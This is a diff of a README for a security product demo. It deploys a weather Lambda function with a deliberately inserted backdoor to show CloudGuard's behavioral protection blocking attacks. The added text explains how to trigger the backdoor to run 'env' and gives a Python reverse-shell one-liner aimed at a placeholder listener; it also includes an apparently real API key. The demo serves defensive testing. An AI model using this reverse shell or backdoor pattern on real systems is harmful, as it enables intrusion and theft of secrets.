@@ -11,7 +11,7 @@ Written by Michael Braun
 
 This document outlines how integrate Cloudguard Workloads with the Serverless framework in a CI/CD pipeline. This function uses the OpenWeatherMap API to return temperature values. <b> This demo simulates a compromised supply chain where a back door has been inserted into the function.</b>
 
-![](images/function1.PNG)
+![](images/function1.png)
 
 This function is deployed through Github Actions. During the deployment, the function is scanned by Proact. Proact will examine the function and alert if there are any issues with the configuration. <br>
 
@@ -98,6 +98,14 @@ To deploy this function to AWS, modifiy the _build_flag and commit the changes. 
 Expand the "Deploy to AWS" tab and scroll to the bottom. You will see the Proact scan. Also, the results of the scan have been uploaded as artifacts. <b>Note the API gateway address.</b> This will be used for testing.<br>
 ![](images/build2.PNG)
 
+### Sync to Check Point CSPM
+
+Depending on when you build your function in relation to the sync interval it may take some time for the information to appear. If you would like to force this synchronization, you can run the following command: <br><br>
+
+```
+curl -X POST https://api.dome9.com/v2/cloudaccounts/<CLOUDGUARD_ACCOUNT_ID/SyncNow  --basic -u DOME9_API_KEY:DOME_API_SECRET  -H 'Accept: application/json'
+```
+
 ## Enabling FSP
 Navigate to the asset within CSPM.<br> 
 
@@ -128,11 +136,58 @@ Here is what it looks like:
 ```
 .\profile.py
 Weather App - Lambda Function
-Target: <insert-api-gateway-here
+Target: <insert-api-gateway-here>
 City: Kelowna
 API Key: d006ed318b33fd0baad3aec15369b3ab
 Working
 .
 .
 ```
-Keep an eye on the CSPM 
+Keep an eye on the serverless asset in CSPM and you will see the behavioral finish learning. Once this is done, you can kill the profile script.
+
+## Legitimate use of CG-Weather-App
+
+To use the function in a non-malicous way, navigate to the scripts directory and run activity.py. Here is an example of normal operation:
+
+```
+./activity.py
+Weather App - Lambda Function
+Target: <insert-api-gateway-here>
+City: Kelowna
+API Key: d006ed318b33fd0baad3aec15369b3ab
+"The current temperature in Kelowna is -1.57 degrees, but it feels like -8.94 degrees"
+```
+
+## Attack Scenario
+
+In this example, we will assume that the supply chain has been compromised and that malicious code was added to an existing function. We will also assume that the FSP has learned the correct behavior of the function. <br> 
+
+To exploit the backdoor, enter the command you'd like to run in the ```City``` field and the word "backdoor" in the ```API Key``` field. <br>
+
+In this example, the attacker is running  ```env``` against the function. 
+
+```
+activity.py
+Weather App - Lambda Function
+Target: https://c9wsie1015.execute-api.us-east-1.amazonaws.com/dev/main.lambda_handler
+City: env
+API Key: backdoor
+""
+```
+
+If the behavioral protection was not enabled, this would have returned the environment variables. However, as you can see, the output is ```""```. You will also see a corresponding alert in the Threat&Events Tab. <br>
+
+![](images/block.PNG)
+
+For a more malicious script, you can try to run a reverse shell.<br>
+
+Here is the command to insert:
+```python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ENTER_YOUR_LISTENING_IP_HERE",<ENTER_PORT_TO_SEND_SHELL));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'```
+
+Here is the corresponding alert:
+
+![](images/block1.PNG)
+
+## Cleanup
+
+To remove this function, create or modify a file call <b>_build_flag</b>. This will run the destroy pipeline and cleanup the entire deployment.
